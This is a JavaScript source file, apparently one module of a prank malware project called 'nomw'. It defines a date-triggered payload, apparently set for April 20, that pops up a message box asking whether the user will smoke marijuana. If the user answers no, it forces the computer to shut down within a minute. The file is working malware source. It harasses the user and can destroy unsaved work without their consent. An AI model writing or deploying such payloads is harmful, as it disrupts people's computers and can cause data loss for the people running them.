/**
 * nomw
 * 
 * File...................MarijuanaPayload.js
 * Created on.............Sunday, 31st December 2017 3:46:08 am
 * Created by.............Relative
 * 
 */
const Payload = require('./Payload')

const Flags = require('../winapi/flags')
const logger = require('../Logger')
const utils = require('../Utils')

module.exports = class MarijuanaPayload extends Payload {
  constructor() {
    super('Marijuana', 'Shutsdown computer if you say you won\'t smoke the weeds', utils.makeDate(4, 20))
  }
  async run() {
    const res = await utils.maliciousMessageBox('Are you going to smoke the marijuanas?', 'Smonk Alert', {
      flags: Flags.MB_YESNO
    })
    if (res != Flags.MB_BTN_YES) {
      utils.shutdown('Please don\'t turn your computer back on until you smoke the dank weeds', '1m')
    } else {
      await utils.maliciousMessageBox('Good, do that smonking and do it good', 'Smonk Alert')
    }
  }
}
